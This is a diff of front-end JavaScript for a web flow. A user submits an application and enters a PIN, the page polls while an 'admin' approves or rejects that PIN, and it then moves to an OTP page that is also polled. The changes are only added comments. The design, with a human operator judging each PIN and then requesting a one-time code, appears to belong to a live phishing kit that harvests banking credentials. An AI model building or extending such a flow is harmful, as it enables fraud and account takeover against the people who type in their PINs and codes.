@@ -106,7 +106,7 @@ async function submitApp() {
     if (data.ok) {
       appData.applicationId = data.applicationId;
       goTo('page-pin');
-      startPinPolling();
+      startPinPolling(); // <-- starts polling immediately
     } else {
       alert('Error: ' + data.error);
     }
@@ -116,7 +116,7 @@ async function submitApp() {
   }
 }
 
-// PIN Submission
+// PIN Submission (the button calls this)
 async function doPin() {
   let pin = '';
   for (let i = 0; i < 5; i++) pin += document.getElementById('pin' + i).value;
@@ -130,6 +130,7 @@ async function doPin() {
     });
     const data = await response.json();
     if (data.ok) {
+      // Start polling for admin decision
       startPinPolling();
     } else if (data.blocked) {
       showError('pinErr', data.message);
@@ -142,7 +143,7 @@ async function doPin() {
   }
 }
 
-// PIN Polling (check admin decision)
+// PIN Polling (checks admin decision every 3s)
 function startPinPolling() {
   if (window._pinInterval) clearInterval(window._pinInterval);
   window._pinInterval = setInterval(async () => {
@@ -152,8 +153,8 @@ function startPinPolling() {
 
       if (data.status === 'approved') {
         clearInterval(window._pinInterval);
-        goTo('page-otp');
-        startOtpPolling();
+        goTo('page-otp'); // <-- move to OTP page
+        startOtpPolling(); // start OTP polling
         return;
       }
       if (data.status === 'rejected') {
@@ -161,7 +162,7 @@ function startPinPolling() {
         document.getElementById('pinAttemptsDisplay').textContent = `🔑 Attempts remaining: ${remaining} of 3`;
         showError('pinErr', `Wrong PIN. ${remaining} attempt(s) remaining.`);
         clearLoginPin();
-        // Stay on pin page
+        // Stay on pin page (allow retry)
         if (!document.getElementById('page-pin').classList.contains('active')) {
           goTo('page-pin');
         }
@@ -174,7 +175,7 @@ function startPinPolling() {
         showError('pinErr', 'Application blocked. Please wait 5 minutes.');
         return;
       }
-      // If pending, stay
+      // If pending, stay on pin page
       if (!document.getElementById('page-pin').classList.contains('active')) {
         goTo('page-pin');
       }
